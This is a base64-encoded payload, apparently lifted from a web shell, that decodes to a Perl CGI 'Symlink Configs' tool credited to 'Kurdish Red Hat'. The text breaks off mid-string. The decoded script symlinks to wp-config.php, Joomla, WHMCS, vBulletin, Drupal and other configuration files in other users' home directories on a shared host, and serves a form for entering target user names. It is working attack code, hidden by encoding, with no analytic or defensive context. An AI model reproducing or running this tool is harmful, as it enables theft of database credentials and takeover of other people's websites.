$da='IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5TeW1saW5rPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoubmV3U3R5bGUxIHsNCiBmb250LWZhbWlseTogVGFob21hOw0KIGZvbnQtc2l6ZTogeC1zbWFsbDsNCiBmb250LXdlaWdodDogYm9sZDsNCiBjb2xvcjogIzAwRkZGRjsNCiAgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCic7DQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiRtc3IgPSBxeHtwd2R9Ow0KJGtvbGE9JG1zci4iLyIuJHVzZXI7DQoka29sYT1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nLi53cC1jb25maWcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLi5zaG9wJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy4uc2hvcCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLicuLm9zY29tJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLi5vc2NvbW1lcmNlJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy4ub3Njb21tZXJjZXMnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLicuLnNob3AyJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy4uc2hvcC4uc2hvcHBpbmcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLicuLnNhbGUnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywka29sYS4nLi5hbWVtYmVyJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRrb2xhLicuLmFtZW1iZXIyJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWVtYmVycy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4ubWVtYmVycycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRrb2xhLicuLjRpbWFnZXMxJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy4uZm9ydW0nKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy4uZm9ydW1zJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRrb2xhLicuLjUnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nLi40Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AxMycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRrb2xhLicuLndwMTMuLndwJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AxMy4uV1AnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLicuLndwMTMuLndwLi5iZXRhJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywka29sYS4nLi53cDEzLi5iZXRhJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AxMy4ucHJlc3MnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AxMy4ud29yZHByZXNzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvV29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRrb2xhLicuLndwMTMuLldvcmRwcmVzcycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AxMy4uV29yZHByZXNzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AxMy4ud29yZHByZXNzLi5iZXRhJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywka29sYS4nLi53cDEzLi5uZXdzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRrb2xhLicuLndwMTMuLm5ldycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AuLmJsb2cnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRrb2xhLicuLndwLi5iZXRhJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AuLmJsb2dzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywka29sYS4nLi53cC4uaG9tZScpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywka29sYS4nLi53cC4ucHJvdGFsJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywka29sYS4nLi53cC4uc2l0ZScpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGtvbGEuJy4ud3AuLm1haW4nKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRrb2xhLicuLndwLi50ZXN0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJGtvbGEuJy4uaWJwcm9hcmNhZGUnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywka29sYS4nLi5pYnByb2FyY2FkZScpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uam9vbWxhMicpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uam9vbWxhLi5wcm90YWwnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLmpvbycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uam9vbWxhLi5jbXMnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLi5qb29tbGEuLnNpdGUnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLi5qb29tbGEuLm1haW4nKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLi5qb29tbGEuLm5ld3MnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLmpvb21sYS4ubmV3Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uam9vbWxhLi5ob21lJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy4udmIuLmNvbmZpZycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nLi52YjMuLmNvbmZpZycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NjL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLicuLnZiMS4uY29uZmlnJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy4uaW5jbHVkZXMuLnZiJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCRrb2xhLicuLnZibHV0dGluLi5jbGFzc19jb3JlLnBocCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywka29sYS4nLi52Ymx1dHRpbi4uY2xhc3NfY29yZS5waHAxJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY2xhc3NfY29yZS5waHAnLCRrb2xhLicuLnZibHV0dGluLi5jbGFzc19jb3JlLnBocDInKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobTE1Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2VudHJhbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4ud2htLmNlbnRyYWwnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobS53aG1jcycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9XSE1DUy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4ud2htLldITUNTJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobWMuV0hNJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobWNzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uc3VwcG9ydCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHAvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLnN1cHAnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLnN1Y3VyZScpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLnN1Y3VyZS53aG0nKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLnN1Y3VyZS53aG1jcycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uY3BhbmVsJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLnBhbmVsJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uaG9zdCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLmhvc3RpbmcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uaG9zdHMnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uam9vbWxhJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGtvbGEuJy4ud2htY3MyJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uY2xpZW50cycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uY2xpZW50Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLmNsaWVudGVzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uY2xpZW50Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4uY2xpZW50c3VwcG9ydCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLmJpbGxpbmcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobS4ubWFuYWdlJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbXkvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobS4ubXknKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLndobS4ubXlzaG9wJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC4uY29uZmlndXJlLnBocCcsJGtvbGEuJy4uemVuY2FydCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC4uY29uZmlndXJlLnBocCcsJGtvbGEuJy4uc2hvcC4uemVuY2FydCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC4uY29uZmlndXJlLnBocCcsJGtvbGEuJy4uc2hvcC4uWkNzaG9wJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywka29sYS4nLi5zbWYnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywka29sYS4nLi5zbWYyJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywka29sYS4nLi5zbWYuLmZvcnVtJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGtvbGEuJy4uc21mLi5mb3J1bXMnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy4udXAnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hcnRpY2xlL2NvbmZpZy5waHAnLCRrb2xhLicuLk53YWh5Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXAvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJy4udXAyJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywka29sYS4nLi42Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZS9kYi5waHAnLCRrb2xhLicuLjcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25uZWN0LnBocCcsJGtvbGEuJy4uUEhQLi5GdXNpb24nKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJGtvbGEuJy4uOScpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLicuLnRyYWlkbnQxJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGtvbGEuJy4uNGltYWdlcycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywka29sYS4nLi5EcnVwYWwnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLjFtZW1iZXInKSA7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLmJpbGxpbmdzJykgOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy4ud2htJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicuLnN1cHBvcnRzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcmVxdWlyZXMvY29uZmlnLnBocCcsJGtvbGEuJy4uQU00U1MuLmhvc3RpbmcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9pbmNsdWRlcy9pc280MjE3LnBocCcsJGtvbGEuJy4uaG9zdGJpbGxzLi5zdXBwb3J0cycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJGtvbGEuJy4uaG9zdGJpbGxzLi5jbGllbnQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywka29sYS4nLi5ob3N0YmlsbHMuLnN1cHBvcnQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2luY2x1ZGVzL2lzbzQyMTcucGhwJywka29sYS4nLi5ob3N0YmlsbHMuLmJpbGxpbmcnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJGtvbGEuJy4uaG9zdGJpbGxzLi5iaWxsaW5ncycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRrb2xhLicuLmhvc3RiaWxscy4uaG9zdCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywka29sYS4nLi5ob3N0YmlsbHMuLmhvc3RzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJGtvbGEuJy4uaG9zdGJpbGxzLi5ob3N0aW5nJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRrb2xhLicuLmhvc3RiaWxscy4uaG9zdGluZ3MnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9pc280MjE3LnBocCcsJGtvbGEuJy4uaG9zdGJpbGxzJyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGJpbGxzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywka29sYS4nLi5ob3N0YmlsbHMuLmhvc3RiaWxscycpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RiaWxsL2luY2x1ZGVzL2lzbzQyMTcucGhwJywka29sYS4nLi5ob3N0YmlsbHMuLmhvc3RiaWxsJyk7DQoNCn0NCmlmICgkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICdQT1NUJykgew0KICByZWFkKFNURElOLCAkYnVmZmVyLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCn0gZWxzZSB7DQogICRidWZmZXIgPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCn0NCkBwYWlycyA9IHNwbGl0KC8mLywgJGJ1ZmZlcik7DQpmb3JlYWNoICRwYWlyIChAcGFpcnMpIHsNCiAgKCRuYW1lLCAkdmFsdWUpID0gc3BsaXQoLz0vLCAkcGFpcik7DQogICRuYW1lID1+IHRyLysvIC87DQogICRuYW1lID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICR2YWx1ZSA9fiB0ci8rLyAvOw0KICAkdmFsdWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJEZPUk17JG5hbWV9ID0gJHZhbHVlOw0KfQ0KaWYgKCRGT1JNe3Bhc3N9IGVxICIiKXsNCnByaW50ICcNCjxib2R5IGNsYXNzPSJuZXdTdHlsZTEiIGJnY29sb3I9IiMwMDAwMDAiPg0KPHA+U3ltbGluayBDb25maWdzPC9wPg0KPHA+PGZvbnQgY29sb3I9IiNDMEMwQzAiPls8L2ZvbnQ+IEVkaXQgQnkgS3VyZGlzaCBSZWQgSGF0IDxmb250IGNvbG9yPSIjQzBDMEMwIj58PC9mb250PiANCihDKW11aG1hZGVtYWQ8c3BhbiBpZD0icmVzdWx0X2JveCIgY2xhc3M9InNob3J0X3RleHQiIGxhbmc9ImVuIj48c3BhbiBzdHlsZSB0aXRsZT4NCjxmb250IGNvbG9yPSIjQzBDMEMwIj58PC9mb250Pjwvc3Bhbj48L3NwYW4+IDxhIGhyZWY9Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9tdWhtYWQuYWJkdWxsa2FyZW0iPg0KPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+PGZvbnQgY29sb3I9IiMwMEZGMDAiPjwvZm9udD48L3NwYW4+PC9hPiANCjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PjwvcD4NCjxmb3JtIG1ldGhvZD0icG9zdCI+DQo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkYiICA+PC90ZXh0YXJlYT48YnIgLz4NCiZuYnNwOzxwPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkY7ICIgIC8+PGJyIC8+DQombmJzcDs8L3A+DQo8cD4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTeW1saW5rIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojMDBGRkZGOyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2